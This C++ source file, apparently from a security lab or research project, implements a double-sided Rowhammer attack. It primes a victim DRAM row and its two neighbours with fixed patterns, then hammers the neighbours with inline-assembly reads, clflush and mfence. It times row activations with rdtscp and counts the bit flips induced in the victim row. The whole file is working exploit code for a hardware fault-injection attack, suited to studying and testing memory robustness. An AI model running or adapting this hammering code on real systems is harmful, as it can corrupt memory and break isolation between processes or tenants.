#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"
#include <unistd.h>
#include <set>

uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {

    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
    memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
    memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
    memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
    clflush(attacker_virt_addr_1);
    clflush(attacker_virt_addr_2);
  
    int num_reads = HAMMERS_PER_ITER;
    uint64_t measures_2 = 0;

    while (num_reads-- > 0 ) {
        uint64_t start = rdtscp();
        asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );
        uint64_t end = rdtscp();
        measures_2 += end - start;
        clflush(attacker_virt_addr_1);
        clflush(attacker_virt_addr_2);
    }
    
    num_reads = HAMMERS_PER_ITER;
    uint64_t measures_1 = 0;
    while (num_reads-- > 0 ) {
        uint64_t start = rdtscp();
        asm volatile(
            "mov (%0), %%rax\n\t"
            :
            : "r" (attacker_virt_addr_1)
            : "rax"
        );
        uint64_t end = rdtscp();
        measures_1 += end - start;
        // so that row buffer has something else
        maccess(attacker_virt_addr_2);
        clflush(attacker_virt_addr_1);
        clflush(attacker_virt_addr_2);
    }

    num_reads = HAMMERS_PER_ITER;
    uint64_t total_time = rdtscp();
    while (num_reads-- > 0 ) {
       asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            "clflush (%0)\n\t"
            "clflush (%1)\n\t"
            "mfence\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );
    }
    total_time = rdtscp() - total_time;

    uint32_t number_of_bitflips_in_target = 0;
    for (uint32_t index = 0; index < ROW_SIZE; index++) {
        // flush 64 byte cacheline
        if (index % 64 == 0) clflush((uint64_t)(vict_virt_addr_ptr + index));
        if (vict_virt_addr_ptr[index] != 0x55) {
            number_of_bitflips_in_target++;
        }
    }
    printf("time to perform 2 ACTS: %ld\n", (measures_2 - measures_1) / HAMMERS_PER_ITER);
    printf("total time to perform %d ACTS: %f ms\n", HAMMERS_PER_ITER, (total_time * 0.3) / 1000000);
    return number_of_bitflips_in_target; 
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t mem_size = 1.8 * BUFFER_SIZE;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim; 
    uint64_t* attacker_1 = (uint64_t*) calloc(1, sizeof(uint64_t));
    uint64_t* attacker_2 = (uint64_t*) calloc(1, sizeof(uint64_t)); 

    while (true) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
        if (get_addresses_to_hammer(victim, attacker_1, attacker_2, 1)) break;
    }


    // row + 1, row - 1
    uint32_t num_bit_flips = hammer_addresses(victim, *attacker_1, *attacker_2);
    print_result(victim, *attacker_1, *attacker_2, num_bit_flips);
}

